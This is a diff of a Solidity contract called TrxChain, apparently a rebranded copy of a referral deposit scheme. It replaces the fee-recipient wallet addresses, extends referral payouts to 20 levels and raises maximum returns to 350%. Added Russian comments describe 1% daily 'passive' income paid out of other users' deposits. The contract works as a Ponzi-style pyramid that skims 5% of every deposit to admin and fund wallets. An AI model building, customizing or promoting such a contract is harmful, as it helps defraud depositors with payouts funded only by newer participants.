@@ -31,7 +31,7 @@ contract TrxChain {
     uint256 public pool_cycle;
     uint256 public pool_balance;
     mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
-    mapping(uint8 => address) public pool_top;
+    mapping(uint8 => address) public pool_top; // 4 топовых участника в день - берется с накопленого в день пула
 
     uint256 public total_users = 1;
     uint256 public total_deposited;
@@ -48,9 +48,9 @@ contract TrxChain {
     constructor(address payable _owner) public {
         owner = _owner;
 
-        etherchain_fund = 0xDaE41A6dE97E6446954D0f6053Ed2008776D6A1b;
-        admin_fee = 0x31aa4BedE2ebD80346acD8a01B99B809438EAa5B;
-
+        etherchain_fund = 0x81Cfe8eFdb6c7B7218DDd5F6bda3AA4cd1554Fd2;
+        admin_fee = 0x90a056b1b27f615b08C0986910879e5b2457D68c;
+        // Ежедневные комиссионные, основанные на ежедневном доходе партнеров, для каждого прямого партнера активирован 1 уровень, максимум 20 уровней, см. Ниже
         ref_bonuses.push(30);
         ref_bonuses.push(10);
         ref_bonuses.push(10);
@@ -66,7 +66,13 @@ contract TrxChain {
         ref_bonuses.push(5);
         ref_bonuses.push(5);
         ref_bonuses.push(5);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3);
+        ref_bonuses.push(3); // 20
 
+        // Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.
         pool_bonuses.push(40);
         pool_bonuses.push(30);
         pool_bonuses.push(20);
@@ -82,25 +88,33 @@ contract TrxChain {
         _deposit(msg.sender, msg.value);
     }
 
+
+    // изменение линий
     function _setUpline(address _addr, address _upline) private {
         if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
             users[_addr].upline = _upline;
             users[_upline].referrals++;
 
             emit Upline(_addr, _upline);
-
             total_users++;
 
             for(uint8 i = 0; i < ref_bonuses.length; i++) {
                 if(_upline == address(0)) break;
 
-                users[_upline].total_structure++;
+                users[_upline].total_structure++; // увеличение структуры пригласившего
 
                 _upline = users[_upline].upline;
             }
         }
     }
 
+
+    // метод внесения депозита
+    // проверяет доступный ввод исходя из возможного депозита по циклу
+    // начисляет награду пригласившему - 10%
+    // доабвляет гаргарду в пул лидеров
+    // отправляет комиссию в фонд и админам
+    //
     function _deposit(address _addr, uint256 _amount) private {
         require(users[_addr].upline != address(0) || _addr == owner, "No upline");
 
@@ -123,24 +137,27 @@ contract TrxChain {
         emit NewDeposit(_addr, _amount);
 
         if(users[_addr].upline != address(0)) {
-            users[users[_addr].upline].direct_bonus += _amount / 10;
+            users[users[_addr].upline].direct_bonus += _amount / 10; // начисление 10% прямого бонуса вышестоящему участнику - 10% Прямая комиссия
 
             emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
         }
 
-        _pollDeposits(_addr, _amount);
+        _pollDeposits(_addr, _amount); // наполнение пула
 
         if(pool_last_draw + 1 days < block.timestamp) {
             _drawPool();
         }
 
-        admin_fee.transfer(_amount / 50);
-        etherchain_fund.transfer(_amount * 3 / 100);
+        admin_fee.transfer(_amount / 50); //  выплата комиссии 2% админу
+        etherchain_fund.transfer(_amount * 3 / 100); // выплата комисси 3% в фонд
 
     }
 
+
+
+    // 3% с каждого депозита отстетивагются в пул лидеров
     function _pollDeposits(address _addr, uint256 _amount) private {
-        pool_balance += _amount * 3 / 100;
+        pool_balance += _amount * 3 / 100; //  Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀
 
         address upline = users[_addr].upline;
 
@@ -177,16 +194,17 @@ contract TrxChain {
         }
     }
 
+    // начисление реферальных вознаграждений линий в структуре
     function _refPayout(address _addr, uint256 _amount) private {
         address up = users[_addr].upline;
 
         for(uint8 i = 0; i < ref_bonuses.length; i++) {
-            if(up == address(0)) break;
+            if(up == address(0)) break; // не для админа
 
             if(users[up].referrals >= i + 1) {
-                uint256 bonus = _amount * ref_bonuses[i] / 100;
+                uint256 bonus = _amount * ref_bonuses[i] / 100; // начисление бонуса комиссионого 30-3%(20 уровней)
 
-                users[up].match_bonus += bonus;
+                users[up].match_bonus += bonus; // здесь кучастнику происхоит сумирование бонусов в соответствие с
 
                 emit MatchPayout(up, _addr, bonus);
             }
@@ -195,11 +213,14 @@ contract TrxChain {
         }
     }
 
+
+
+    // метод накапливает 4 лидерам их награды и очищает список
     function _drawPool() private {
         pool_last_draw = uint40(block.timestamp);
         pool_cycle++;
 
-        uint256 draw_amount = pool_balance / 10;
+        uint256 draw_amount = pool_balance / 10; // 10%  - Ежедневный рейтинг лучших пулов 3% от ВСЕХ депозитов, отведенных в пуле, каждые 24 часа 10% пула распределяется среди 4 лучших спонсоров по объему.⠀
 
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
@@ -223,9 +244,9 @@ contract TrxChain {
     }
 
     function withdraw() external {
-        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
+        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender); // текущий депозит и макс вывод от депозита
 
-        require(users[msg.sender].payouts < max_payout, "Full payouts");
+        require(users[msg.sender].payouts < max_payout, "Full payouts"); // ывел весь депозит
 
         // Deposit payout
         if(to_payout > 0) {
@@ -291,16 +312,16 @@ contract TrxChain {
             emit LimitReached(msg.sender, users[msg.sender].payouts);
         }
     }
-
+    // максимальный доход 350 %
     function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
-        return _amount * 31 / 10;
+        return _amount * 35 / 10; // 350% для изменения цикла
     }
-
+    //возвращает текущий депозит и максимальный доход за вычетом выводов и наград для адреса
     function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
         max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
 
         if(users[_addr].deposit_payouts < max_payout) {
-            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;
+            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;  // 1% пассив каждый день
 
             if(users[_addr].deposit_payouts + payout > max_payout) {
                 payout = max_payout - users[_addr].deposit_payouts;
@@ -308,9 +329,6 @@ contract TrxChain {
         }
     }
 
-    /*
-        Only external call
-    */
     function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
     }
@@ -323,6 +341,7 @@ contract TrxChain {
         return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
     }
 
+    // озвращает инфо о 4 адресах оидерах и их балансах
     function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
         for(uint8 i = 0; i < pool_bonuses.length; i++) {
             if(pool_top[i] == address(0)) break;
